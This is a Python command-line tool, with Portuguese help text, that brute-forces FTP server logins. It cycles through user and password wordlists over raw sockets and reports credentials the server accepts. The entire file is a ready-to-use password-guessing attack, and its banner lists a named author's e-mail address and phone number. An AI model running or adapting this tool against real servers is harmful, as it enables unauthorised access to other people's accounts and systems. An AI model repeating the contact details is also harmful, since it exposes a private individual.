# -*- coding:utf-8 -*-
#!/usr/bin/python3

import sys
import socket
import re
import time

print("""
        ##########################################
        ################        ##################
        ##########                     ###########
        ####                                  ####
        ##               #######                ##
        ##               #######                ##
        ####                                  ####
        ##########                     ###########
        ################        ##################
        ##########################################


        - Nome: Filipe Malaquias Londrino  
        - E-mail: malaquias@devdesucesso.net 
        - Contacto: 933146546

""")

def brute_force_user(server, user, password_list):
    with open(password_list, 'r') as passwords:
        for key in passwords.readlines():
            key = key.strip()
            print(f"Testando User: {user} ===> Senha: {key}")
            if attempt_login(server, user, key):
                print(f"Senha encontrada: >> {key} para o usuário: {user}")
                break
            else:
                print("Senha Inválida...\n")
                time.sleep(3)

def brute_force_password(server, password, user_list):
    with open(user_list, 'r') as users:
        for user in users.readlines():
            user = user.strip()
            print(f"Testando User: {user} ===> Senha: {password}")
            if attempt_login(server, user, password):
                print(f"Senha encontrada: >> {password} para o usuário: {user}")
                break
            else:
                print("Senha Inválida...\n")
                time.sleep(3)

def brute_force_combination(server, user_list, password_list):
    with open(user_list, 'r') as users:
        with open(password_list, 'r') as passwords:
            for user in users.readlines():
                user = user.strip()
                for key in passwords.readlines():
                    key = key.strip()
                    print(f"Testando User: {user} ===> Senha: {key}")
                    if attempt_login(server, user, key):
                        print(f"Senha encontrada: >> {key} para o usuário: {user}")
                        return
                    else:
                        print("Senha Inválida...\n")
                        time.sleep(3)
                passwords.seek(0)

def attempt_login(server, user, password):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, 21))
    s.recv(1024)
    s.send(b"USER " + user.encode('utf-8') + b"\r\n")
    s.recv(1024)
    s.send(b"PASS " + password.encode('utf-8') + b"\r\n")
    res = s.recv(1024)
    s.send(b"QUIT\r\n")
    s.close()
    return re.search(b"230", res) is not None

if len(sys.argv) == 2 and sys.argv[1] == "--help":
    print("\n\nMODO DE USAR:")
    print(" >>> python bruteforce.py 192.0.0.1 -U <usuario> -PL <lista_senhas>")
    print("    - Tenta diferentes senhas para um usuário específico no servidor FTP.")
    print(" \n >>> python bruteforce.py 192.0.0.1 -P <senha> -UL <lista_usuarios>")
    print("    - Tenta diferentes usuários com uma senha específica no servidor FTP.")
    print(" \n >>> python bruteforce.py 192.0.0.1 -UL <lista_usuarios> -PL <lista_senhas>")
    print("    - Tenta todas as combinações de usuários e senhas no servidor FTP.")
    print("\n\nOPÇÕES:")
    print(" --help      : Mostra este manual de ajuda.")
    print(" -U <usuario>: Especifica o nome do usuário.")
    print(" -P <senha>  : Especifica a senha a ser testada.")
    print(" -UL <lista_usuarios>: Especifica o arquivo contendo a lista de usuários.")
    print(" -PL <lista_senhas> : Especifica o arquivo contendo a lista de senhas.")
    print("\n\n\ OBS: Ao adicionar as listas coloque o caminho correcto <pasta coreta> do arquivo txt.")
    print(" As listas de usuaios e senhas devem estar em arquivos com a extensão .txt")
    print("\n\n EXEMPLO:")
    print(" python bruteforce.py 192.168.0.1 -U <usuario> -PL <lista_senhas>")
    print(" python bruteforce.py 192.168.0.1 -P <senha> -UL <lista_usuarios>")
    print(" python bruteforce.py 192.168.0.1 -UL <lista_usuarios> -PL <lista_senhas>")
    sys.exit()

if len(sys.argv) < 5:
    print("BEM-VINDO AO SCRIPT, Para usar siga o exemplo abaixo:")
    print(" python bruteforce.py 192.168.0.1 -U <usuario> -PL <lista_senhas>")
    print(" python bruteforce.py 192.168.0.1 -P <senha> -UL <lista_usuarios>")
    print(" python bruteforce.py 192.168.0.1 -UL <lista_usuarios> -PL <lista_senhas>")
    sys.exit()

server = sys.argv[1]

if sys.argv[2] == "-U" and sys.argv[4] == "-PL":
    user = sys.argv[3]
    password_list = sys.argv[5]
    brute_force_user(server, user, password_list)

elif sys.argv[2] == "-P" and sys.argv[4] == "-UL":
    password = sys.argv[3]
    user_list = sys.argv[5]
    brute_force_password(server, password, user_list)

elif sys.argv[2] == "-UL" and sys.argv[4] == "-PL":
    user_list = sys.argv[3]
    password_list = sys.argv[5]
    brute_force_combination(server, user_list, password_list)

else:
    print("Parâmetros inválidos. Por favor, siga o exemplo de uso:")
    print(" python bruteforce.py 192.168.0.1 -U <usuario> -PL <lista_senhas>")
    print(" python bruteforce.py 192.168.0.1 -P <senha> -UL <lista_usuarios>")
    print(" python bruteforce.py 192.168.0.1 -UL <lista_usuarios> -PL <lista_senhas>")
    sys.exit()
